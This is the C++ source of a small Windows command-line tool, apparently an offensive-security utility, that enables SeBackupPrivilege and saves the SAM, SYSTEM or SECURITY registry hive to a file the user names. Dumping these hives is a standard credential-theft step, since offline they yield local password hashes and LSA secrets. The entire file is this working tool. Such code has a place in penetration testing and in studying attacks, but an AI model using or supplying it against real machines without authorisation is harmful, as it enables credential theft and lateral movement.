// regsave.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <comdef.h>

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("[-] The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char** argv) {


    if (argc != 3) {
        printf("Usage: dumpfile.exe SAM/SYSTEM/SECURITY pathtosavedfile\n");
        exit(1);
    }
    if ((argv[1] != std::string("SAM")) && (argv[1] != std::string("SYSTEM")) && (argv[1] != std::string("SECURITY"))){
        printf("Usage: dumpfile.exe SAM/SYSTEM/SECURITY pathtosavedfile\n");
        exit(1);
    }

    
    HKEY clave;
    std::string arg1 = argv[1];
    std::string arg2 = argv[2];
    
    BSTR b = _com_util::ConvertStringToBSTR(arg1.c_str());
    LPWSTR lp = b;

    BSTR b2 = _com_util::ConvertStringToBSTR(arg2.c_str());
    LPWSTR lp2 = b2;

    HANDLE hProc = GetCurrentProcess();
    HANDLE hToken = nullptr;

    BOOL resultadohandle = OpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    

    if (resultadohandle == TRUE) { printf("[+] Handle to the token opened\n"); }
    else { printf("[-] Error when opening process token "); }
    
    BOOL resultadopriv = SetPrivilege(hToken, SE_BACKUP_NAME, TRUE);

    if (resultadopriv == TRUE) { printf("[+] SeBackupPrivilege successfully added to token\n"); }
    else { printf("[-] Error when assigning SeBackupPrivilege "); }

    try {

        LSTATUS test = RegOpenKeyExW(HKEY_LOCAL_MACHINE, lp, 0, KEY_ALL_ACCESS, &clave);
        if (test == 0) { printf("[+] Handle to the registry key opened\n"); }
        else { printf("[-] Error code: %ld\n", test); exit(1); }
        LSTATUS result = RegSaveKeyW(clave, lp2, NULL);
        if (result == 0) { printf("[+] Success!\n"); }else { printf("[-] Error code: %ld\n", result); exit(1);}
        
    }
    catch (...) {
        printf("[-] Error %d.\n", GetLastError());
    }
    
}